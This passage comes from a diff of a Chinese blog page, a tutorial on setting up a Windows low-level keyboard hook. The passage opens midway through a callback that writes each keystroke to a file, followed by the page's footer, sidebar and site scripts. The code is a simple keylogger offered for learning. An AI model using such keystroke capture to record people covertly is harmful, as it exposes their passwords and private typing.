class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">113</span>:<span class="comment">//F2关闭</span></span><br><span class="line">					fwrite(<span class="string">"F2"</span>,<span class="keyword">sizeof</span>(<span class="string">"F2"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					fclose(f);</span><br><span class="line">					DestroyWindow(hgWnd);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">					fwrite(<span class="string">"←"</span>,<span class="keyword">sizeof</span>(<span class="string">"←"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">					fwrite(<span class="string">"→"</span>,<span class="keyword">sizeof</span>(<span class="string">"←"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">					fwrite(<span class="string">"↑"</span>,<span class="keyword">sizeof</span>(<span class="string">"←"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">40</span>:</span><br><span class="line">					fwrite(<span class="string">"↓"</span>,<span class="keyword">sizeof</span>(<span class="string">"←"</span>)<span class="number">-1</span>,<span class="number">1</span>,f);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">default</span>:</span><br><span class="line">					fputc((<span class="keyword">char</span>)p-&gt;vkCode,f);</span><br><span class="line">			&#125;</span><br><span class="line">					fflush(<span class="built_in">stdin</span>);</span><br><span class="line">					fclose(f);</span><br><span class="line">		&#125;</span><br><span class="line">						</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(myhook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="结果截图"><strong>结果截图</strong></h2><p><img src="http://ww2.sinaimg.cn/mw690/d374fab4gw1f4xltecd10j20kg0brwgx.jpg" alt="结果"><br>如果还有不了解，可以访问<a href="http://www.lellansin.com/windows-api-%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89-hook-%E9%92%A9%E5%AD%90%E7%9B%91%E5%90%AC%EF%BC%88%E7%BC%96%E5%86%99%E4%B8%AD%EF%BC%89.html" target="_blank" rel="noopener">hook教程</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/"> #windows </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/20/android-inputfilter/">android下EditText的简单输入控制</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/11/14/bmpcreate/">文件流创建位图</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/06/17/hook/"
+               data-title="Windows下简单hook键盘监听" data-url="http://yoursite.com/2016/06/17/hook/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="http://ww2.sinaimg.cn/large/d374fab4gw1f60e2alz4fj20e80e8gmp.jpg" alt="Rin Hashizora" />
+          <p class="site-author-name">Rin Hashizora</p>
+        </div>
+        <p class="site-description motion-element">stay foolish,stay hungry</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">0</span>
+              <span class="site-state-item-name">categories</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#认识Hook"><span class="nav-number">1.</span> <span class="nav-text">认识Hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows下键盘监听"><span class="nav-number">2.</span> <span class="nav-text">Windows下键盘监听</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-绘制窗口"><span class="nav-number">2.1.</span> <span class="nav-text">1.绘制窗口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-设置钩子"><span class="nav-number">2.2.</span> <span class="nav-text">2.设置钩子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SetWindowsHookEx_函数"><span class="nav-number">2.2.1.</span> <span class="nav-text">SetWindowsHookEx 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#钩子链表"><span class="nav-number">2.2.2.</span> <span class="nav-text">钩子链表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#钩子子程序"><span class="nav-number">2.2.3.</span> <span class="nav-text">钩子子程序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-设置键盘监听"><span class="nav-number">2.3.</span> <span class="nav-text">3.设置键盘监听</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结果截图"><span class="nav-number">3.</span> <span class="nav-text">结果截图</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        
+<div class="count">
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+</div>
+
+<div class="copyright">
+  
+  &copy; &nbsp; 
+  2018
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Rin Hashizora</span>
+</div>
+
+<!--<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    by NexT
+  </a>
+</div>-->
+
+
+
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"centzu"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
